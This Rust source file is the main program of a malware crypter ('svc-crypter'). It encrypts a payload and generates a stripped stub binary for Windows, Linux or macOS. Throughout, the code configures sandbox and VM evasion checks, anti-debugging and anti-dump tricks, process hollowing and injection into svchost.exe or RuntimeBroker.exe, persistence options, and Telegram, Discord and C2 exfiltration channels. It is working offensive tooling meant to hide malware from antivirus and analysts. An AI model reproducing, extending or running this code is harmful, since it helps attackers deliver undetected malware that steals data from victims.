use aes_gcm::{
    aead::{Aead, KeyInit, OsRng},
    Aes256Gcm, Nonce,
};
use argon2::{Algorithm, Argon2, Params, Version};
use rand::RngCore;
use sha2::{Digest, Sha256};
use std::path::{Path, PathBuf};
use std::process::Command;

use crypter_ir::*;
use crypter_synth::Synth;

#[derive(serde::Deserialize, Default)]
struct SecretFile {
    #[serde(default)]
    telegram_token: String,
    #[serde(default)]
    telegram_chat: String,
    #[serde(default)]
    discord_webhook: String,
    #[serde(default)]
    c2_url: String,
    #[serde(default)]
    c2_auth: String,
}

#[derive(serde::Deserialize, Default)]
struct DirectiveFile {
    #[serde(default)]
    tiers: Vec<String>,
    #[serde(default)]
    persistence: Vec<String>,
    #[serde(default)]
    uninstall: bool,
}

#[derive(Clone, Copy, PartialEq)]
enum Profile {
    Stealth,
    Fast,
    Compatible,
    Balanced,
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 2 {
        usage();
        std::process::exit(1);
    }

    let payload_path = PathBuf::from(&args[1]);
    let payload_bytes = std::fs::read(&payload_path).unwrap_or_else(|e| {
        eprintln!("[!] read payload: {}", e);
        std::process::exit(1);
    });

    let mut target_os = TargetOs::Windows;
    let mut out_name = "svc".to_string();
    let mut secrets = SecretFile::default();
    let mut directive = DirectiveFile::default();
    let mut profile = Profile::Balanced;
    let mut dry_run = false;
    let mut seed_override: Option<[u8; 32]> = None;

    let mut i = 2;
    while i < args.len() {
        match args[i].as_str() {
            "--target" => {
                if let Some(t) = args.get(i + 1) {
                    target_os = match t.as_str() {
                        "linux" => TargetOs::Linux,
                        "macos" => TargetOs::Macos,
                        _ => TargetOs::Windows,
                    };
                }
                i += 2;
            }
            "--out" => {
                out_name = args.get(i + 1).cloned().unwrap_or_else(|| "svc".into());
                i += 2;
            }
            "--cfg-file" => {
                if let Some(p) = args.get(i + 1) {
                    let path = expand_tilde(p);
                    let raw = std::fs::read_to_string(&path).unwrap_or_else(|e| {
                        eprintln!("[!] cfg-file {}: {}", path.display(), e);
                        std::process::exit(1);
                    });
                    check_secret_perms(&path);
                    secrets = serde_json::from_str(&raw).unwrap_or_default();
                }
                i += 2;
            }
            "--directive-file" => {
                if let Some(p) = args.get(i + 1) {
                    let path = expand_tilde(p);
                    let raw = std::fs::read_to_string(&path).unwrap_or_default();
                    directive = serde_json::from_str(&raw).unwrap_or_default();
                }
                i += 2;
            }
            "--profile" => {
                if let Some(p) = args.get(i + 1) {
                    profile = match p.as_str() {
                        "stealth" => Profile::Stealth,
                        "fast" => Profile::Fast,
                        "compatible" => Profile::Compatible,
                        _ => Profile::Balanced,
                    };
                }
                i += 2;
            }
            "--seed" => {
                if let Some(s) = args.get(i + 1) {
                    seed_override = hex_to_32(s);
                }
                i += 2;
            }
            "--dry-run" => {
                dry_run = true;
                i += 1;
            }
            "--tg-token" => {
                secrets.telegram_token = args.get(i + 1).cloned().unwrap_or_default();
                i += 2;
            }
            "--tg-chat" => {
                secrets.telegram_chat = args.get(i + 1).cloned().unwrap_or_default();
                i += 2;
            }
            "--discord" => {
                secrets.discord_webhook = args.get(i + 1).cloned().unwrap_or_default();
                i += 2;
            }
            "--c2" => {
                secrets.c2_url = args.get(i + 1).cloned().unwrap_or_default();
                i += 2;
            }
            "--c2-auth" => {
                secrets.c2_auth = args.get(i + 1).cloned().unwrap_or_default();
                i += 2;
            }
            "--tiers" => {
                if let Some(t) = args.get(i + 1) {
                    directive.tiers = t.split(',').map(|s| s.to_string()).collect();
                }
                i += 2;
            }
            "--persistence" => {
                if let Some(t) = args.get(i + 1) {
                    directive.persistence = t.split(',').map(|s| s.to_string()).collect();
                }
                i += 2;
            }
            _ => i += 1,
        }
    }

    let mut seed = seed_override.unwrap_or_else(|| {
        let mut s = [0u8; 32];
        OsRng.fill_bytes(&mut s);
        s
    });
    if seed_override.is_none() {
        OsRng.fill_bytes(&mut seed);
    }
    let mut xor_key = [0u8; 32];
    OsRng.fill_bytes(&mut xor_key);

    let mut rng = rand::thread_rng();
    use rand::Rng;

    let (gates, debug_check, decrypt, execution, integrity, anti_dump, anti_emulation, junk_density, virtualization) =
        roll_profile(&mut rng, profile);
    let resolver = pick_resolver(&mut rng);

    let mut salt = [0u8; 32];
    OsRng.fill_bytes(&mut salt);
    let mut nonce16 = [0u8; 16];
    OsRng.fill_bytes(&mut nonce16);

    let mut key_input = Vec::new();
    key_input.extend_from_slice(&salt);
    key_input.extend_from_slice(&seed);
    let mut p_hash = Sha256::new();
    p_hash.update(&payload_bytes);
    key_input.extend_from_slice(&p_hash.finalize());

    let params = Params::new(64 * 1024, 3, 1, Some(32)).expect("params");
    let a2 = Argon2::new(Algorithm::Argon2id, Version::V0x13, params);
    let mut key = [0u8; 32];
    a2.hash_password_into(&key_input, b"svc_crypter_v3", &mut key)
        .expect("argon2");

    let cipher = Aes256Gcm::new((&key).into());
    let mut payload_nonce = [0u8; 12];
    OsRng.fill_bytes(&mut payload_nonce);
    let ct = cipher
        .encrypt(Nonce::from_slice(&payload_nonce), payload_bytes.as_slice())
        .expect("aead");
    let mut blob = Vec::with_capacity(12 + ct.len());
    blob.extend_from_slice(&payload_nonce);
    blob.extend_from_slice(&ct);

    let mut wrapped_key = [0u8; 32];
    for j in 0..32 {
        wrapped_key[j] = key[j] ^ seed[j] ^ xor_key[j];
    }

    let build_id = hex::encode(&seed[..8]);

    let directive_json = serde_json::json!({
        "tiers": directive.tiers,
        "persistence": directive.persistence,
        "uninstall": directive.uninstall,
        "rate_limit_ms": 0u64,
    })
    .to_string();

    let prog = StubProgram {
        seed,
        gates: gates.clone(),
        debug_check: debug_check.clone(),
        resolver: resolver.clone(),
        decrypt: decrypt.clone(),
        virtualization,
        integrity: integrity.clone(),
        execution: execution.clone(),
        key_material: KeyMaterial {
            salt: salt.to_vec(),
            nonce: nonce16.to_vec(),
            bind_to_fingerprint: false,
            bind_to_code_hash: true,
        },
        payload_blob: blob,
        wrapped_key,
        target_os: target_os.clone(),
        config_xor_key: xor_key,
        anti_dump,
        anti_emulation,
        junk_density,
        build_id: build_id.clone(),
        directive_json: directive_json.clone(),
        telegram_token: secrets.telegram_token.clone(),
        telegram_chat: secrets.telegram_chat.clone(),
        discord_webhook: secrets.discord_webhook.clone(),
        c2_url: secrets.c2_url.clone(),
        c2_auth: secrets.c2_auth.clone(),
    };

    println!("[*] payload: {} ({} bytes)", payload_path.display(), payload_bytes.len());
    println!("[*] target: {:?}", target_os);
    println!("[*] profile: {:?}", profile_name(profile));
    println!("[*] build-id: {}", build_id);
    println!("[*] gates: {:?}", prog.gates);
    println!("[*] debug: {:?}", prog.debug_check);
    println!("[*] resolver: {:?}", prog.resolver);
    println!("[*] decrypt: {:?}", prog.decrypt);
    println!("[*] exec: {:?}", prog.execution);
    println!("[*] integrity: {:?}", prog.integrity);
    println!("[*] virtualization: {}", prog.virtualization);
    println!("[*] anti-dump: {}", prog.anti_dump);
    println!("[*] anti-emulation: {}", prog.anti_emulation);
    println!("[*] junk-density: {:.2}", prog.junk_density);
    println!("[*] directive: {}", directive_json);
    println!("[*] exfil secrets:");
    println!("    telegram_token: {}", mask(&prog.telegram_token));
    println!("    telegram_chat:  {}", mask(&prog.telegram_chat));
    println!("    discord:        {}", mask(&prog.discord_webhook));
    println!("    c2_url:         {}", mask(&prog.c2_url));
    println!("    c2_auth:        {}", mask(&prog.c2_auth));

    let mut synth = Synth::new(seed, xor_key);
    let source = synth.emit(&prog);

    let build_dir = PathBuf::from("out").join(&out_name);
    std::fs::create_dir_all(&build_dir).expect("mkdir");
    let src_path = build_dir.join("stub.rs");
    std::fs::write(&src_path, &source).expect("write stub");

    let cargo_toml = build_dir.join("Cargo.toml");
    std::fs::write(&cargo_toml, stub_cargo_toml(&target_os)).expect("write cargo");
    let main_rs = build_dir.join("src").join("main.rs");
    std::fs::create_dir_all(main_rs.parent().unwrap()).expect("mkdir src");
    std::fs::write(&main_rs, &source).expect("write main");
    let _ = std::fs::remove_file(&src_path);

    write_audit(&build_dir, &prog, &target_os, profile);

    if dry_run {
        println!("[+] dry-run: stub emitted at {}", main_rs.display());
        return;
    }

    let target_triple = match target_os {
        TargetOs::Windows => "x86_64-pc-windows-gnu",
        TargetOs::Linux => "x86_64-unknown-linux-gnu",
        TargetOs::Macos => "aarch64-apple-darwin",
    };

    let out_bin = build_dir.join(format!(
        "{}{}",
        out_name,
        if matches!(target_os, TargetOs::Windows) {
            ".exe"
        } else {
            ""
        }
    ));

    println!("[*] compiling via cargo");

    let status = Command::new("cargo")
        .args([
            "build",
            "--release",
            "--manifest-path",
            cargo_toml.to_str().unwrap(),
            "--target",
            target_triple,
            "--target-dir",
            build_dir.join("target").to_str().unwrap(),
        ])
        .status()
        .expect("cargo build");

    if !status.success() {
        eprintln!("[!] cargo build failed");
        std::process::exit(1);
    }

    let produced = build_dir
        .join("target")
        .join(target_triple)
        .join("release")
        .join(if matches!(target_os, TargetOs::Windows) {
            "stub.exe"
        } else {
            "stub"
        });

    if produced.exists() {
        let _ = std::fs::copy(&produced, &out_bin);
    }

    let bin = std::fs::read(&out_bin).unwrap_or_default();
    let mut h = Sha256::new();
    h.update(&bin);
    println!(
        "[+] built: {} ({} bytes, sha256 {})",
        out_bin.display(),
        bin.len(),
        hex::encode(h.finalize())
    );
}

fn usage() {
    eprintln!("usage: svc-crypter <payload> [options]");
    eprintln!();
    eprintln!("options:");
    eprintln!("  --target windows|linux|macos     (default windows)");
    eprintln!("  --out <name>                     output basename");
    eprintln!("  --profile stealth|fast|compatible|balanced");
    eprintln!("  --seed <64-hex>                  fixed build seed");
    eprintln!("  --dry-run                        emit stub only");
    eprintln!();
    eprintln!("  --cfg-file <secrets.json>");
    eprintln!("  --directive-file <directive.json>");
    eprintln!("  --tiers tier1,tier2");
    eprintln!("  --persistence entry1,entry2");
    eprintln!("  --tg-token <TOKEN> --tg-chat <ID>");
    eprintln!("  --discord <WEBHOOK> --c2 <URL> --c2-auth <BEARER>");
}

fn roll_profile<R: rand::Rng>(
    rng: &mut R,
    profile: Profile,
) -> (
    Vec<Gate>,
    DebugCheck,
    DecryptScheme,
    ExecutionMethod,
    IntegrityCheck,
    bool,
    bool,
    f32,
    bool,
) {
    let mut gates = vec![
        Gate::SleepJitter {
            min_ms: rng.gen_range(15_000..45_000),
            max_ms: rng.gen_range(75_000..180_000),
        },
        Gate::SleepAccelerationCheck {
            sleep_ms: rng.gen_range(3000..6000),
            min_ratio: 0.8,
        },
        Gate::UptimeMin(rng.gen_range(180..900)),
        Gate::UsernameBlocklist,
        Gate::HostnameBlocklist,
        Gate::ApiHammerCheck,
        Gate::HypervisorCpuid,
        Gate::ParentDebugger,
    ];

    match profile {
        Profile::Stealth => {
            gates.push(Gate::RamMinMb(rng.gen_range(3000..6000)));
            gates.push(Gate::CpuCoresMin(rng.gen_range(2..4)));
            gates.push(Gate::VirtualizationArtifacts);
            gates.push(Gate::SnapshotCheck);
            gates.push(Gate::CursorMotion {
                samples: rng.gen_range(2..6),
            });
            gates.push(Gate::DomainJoined);
        }
        Profile::Balanced => {
            if rng.gen_bool(0.7) {
                gates.push(Gate::RamMinMb(rng.gen_range(3000..6000)));
            }
            if rng.gen_bool(0.6) {
                gates.push(Gate::CpuCoresMin(rng.gen_range(2..4)));
            }
            if rng.gen_bool(0.5) {
                gates.push(Gate::VirtualizationArtifacts);
            }
            if rng.gen_bool(0.4) {
                gates.push(Gate::SnapshotCheck);
            }
            if rng.gen_bool(0.4) {
                gates.push(Gate::DomainJoined);
            }
        }
        Profile::Fast => {
            gates.retain(|g| {
                !matches!(
                    g,
                    Gate::SleepJitter { .. }
                        | Gate::SleepAccelerationCheck { .. }
                        | Gate::VirtualizationArtifacts
                        | Gate::SnapshotCheck
                )
            });
        }
        Profile::Compatible => {
            gates.retain(|g| {
                !matches!(
                    g,
                    Gate::HypervisorCpuid
                        | Gate::VirtualizationArtifacts
                        | Gate::ParentDebugger
                        | Gate::SnapshotCheck
                )
            });
        }
    }

    let debug_check = match rng.gen_range(0..6) {
        0 => DebugCheck::IsDebuggerPresent,
        1 => DebugCheck::PEBBeingDebugged,
        2 => DebugCheck::NtGlobalFlag,
        3 => DebugCheck::NtQueryInformationProcess,
        4 => DebugCheck::TimingCheck {
            rounds: rng.gen_range(3..8) as u8,
        },
        _ => DebugCheck::NtQueryInformationProcess,
    };

    let decrypt = match rng.gen_range(0..4) {
        0 => DecryptScheme::AesGcm,
        1 => DecryptScheme::ChaCha20Poly1305,
        2 => DecryptScheme::AesGcm,
        _ => DecryptScheme::AesGcm,
    };

    let execution = match rng.gen_range(0..4) {
        0 => ExecutionMethod::ImageMap,
        1 => ExecutionMethod::SpawnInject {
            host: "C:\\Windows\\System32\\svchost.exe".into(),
        },
        2 => ExecutionMethod::ProcessHollow {
            host: "C:\\Windows\\System32\\RuntimeBroker.exe".into(),
        },
        _ => ExecutionMethod::ImageMap,
    };

    let integrity = match rng.gen_range(0..3) {
        0 => IntegrityCheck::TextSectionHash,
        1 => IntegrityCheck::RegionCrc {
            start: 0x1000,
            len: rng.gen_range(2000..8000),
        },
        _ => IntegrityCheck::None,
    };

    let anti_dump = rng.gen_bool(0.9);
    let anti_emulation = rng.gen_bool(0.9);
    let junk_density = rng.gen_range(0.3..0.7);
    let virtualization = rng.gen_bool(0.85);

    (
        gates,
        debug_check,
        decrypt,
        execution,
        integrity,
        anti_dump,
        anti_emulation,
        junk_density,
        virtualization,
    )
}

fn pick_resolver<R: rand::Rng>(rng: &mut R) -> Resolver {
    match rng.gen_range(0..4) {
        0 => Resolver::ExportWalkFnv1a,
        1 => Resolver::ExportWalkCrc32,
        2 => Resolver::ExportWalkDjb2,
        _ => Resolver::PebWalk,
    }
}

fn profile_name(p: Profile) -> &'static str {
    match p {
        Profile::Stealth => "stealth",
        Profile::Fast => "fast",
        Profile::Compatible => "compatible",
        Profile::Balanced => "balanced",
    }
}

fn stub_cargo_toml(target: &TargetOs) -> String {
    let mut s = String::new();
    s.push_str("[package]\n");
    s.push_str("name = \"stub\"\n");
    s.push_str("version = \"0.1.0\"\n");
    s.push_str("edition = \"2021\"\n\n");
    s.push_str("[[bin]]\n");
    s.push_str("name = \"stub\"\n");
    s.push_str("path = \"src/main.rs\"\n\n");
    s.push_str("[dependencies]\n");
    s.push_str("aes-gcm = \"0.10\"\n");
    s.push_str("chacha20poly1305 = \"0.10\"\n");
    if matches!(target, TargetOs::Windows) {
        s.push_str("\n[target.'cfg(windows)'.dependencies]\n");
        s.push_str("windows-sys = { version = \"0.59\", features = [\"Win32_Foundation\",\"Win32_System_Threading\"] }\n");
    }
    s.push_str("\n[profile.release]\n");
    s.push_str("opt-level = \"z\"\n");
    s.push_str("lto = \"fat\"\n");
    s.push_str("codegen-units = 1\n");
    s.push_str("panic = \"abort\"\n");
    s.push_str("strip = \"symbols\"\n");
    s
}

fn write_audit(dir: &Path, prog: &StubProgram, target: &TargetOs, profile: Profile) {
    let audit = serde_json::json!({
        "build_id": prog.build_id,
        "target": format!("{:?}", target),
        "profile": profile_name(profile),
        "gates": format!("{:?}", prog.gates),
        "debug_check": format!("{:?}", prog.debug_check),
        "resolver": format!("{:?}", prog.resolver),
        "decrypt": format!("{:?}", prog.decrypt),
        "execution": format!("{:?}", prog.execution),
        "integrity": format!("{:?}", prog.integrity),
        "virtualization": prog.virtualization,
        "anti_dump": prog.anti_dump,
        "anti_emulation": prog.anti_emulation,
        "junk_density": prog.junk_density,
        "directive": prog.directive_json,
        "secrets_masked": {
            "telegram_token": mask(&prog.telegram_token),
            "telegram_chat": mask(&prog.telegram_chat),
            "discord_webhook": mask(&prog.discord_webhook),
            "c2_url": mask(&prog.c2_url),
            "c2_auth": mask(&prog.c2_auth),
        },
    });
    let _ = std::fs::write(
        dir.join("build.json"),
        serde_json::to_string_pretty(&audit).unwrap_or_default(),
    );
}

fn mask(s: &str) -> String {
    if s.is_empty() {
        return "(none)".into();
    }
    if s.len() <= 8 {
        return "********".into();
    }
    format!("{}…{}", &s[..4], &s[s.len() - 4..])
}

fn hex_to_32(s: &str) -> Option<[u8; 32]> {
    let s = s.trim();
    if s.len() != 64 {
        return None;
    }
    let mut out = [0u8; 32];
    for i in 0..32 {
        let hi = nib(s.as_bytes()[i * 2])?;
        let lo = nib(s.as_bytes()[i * 2 + 1])?;
        out[i] = (hi << 4) | lo;
    }
    Some(out)
}

fn nib(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

fn expand_tilde(p: &str) -> PathBuf {
    if let Some(rest) = p.strip_prefix("~/") {
        if let Ok(home) = std::env::var("HOME") {
            return PathBuf::from(home).join(rest);
        }
        #[cfg(windows)]
        {
            if let Ok(profile) = std::env::var("USERPROFILE") {
                return PathBuf::from(profile).join(rest);
            }
        }
    }
    PathBuf::from(p)
}

fn check_secret_perms(p: &Path) {
    #[cfg(unix)]
    {
        use std::os::unix::fs::MetadataExt;
        if let Ok(m) = std::fs::metadata(p) {
            if m.mode() & 0o077 != 0 {
                eprintln!(
                    "[!] warning: secrets file {} is world/group readable (mode {:o})",
                    p.display(),
                    m.mode() & 0o777
                );
            }
        }
    }
    let _ = p;
}
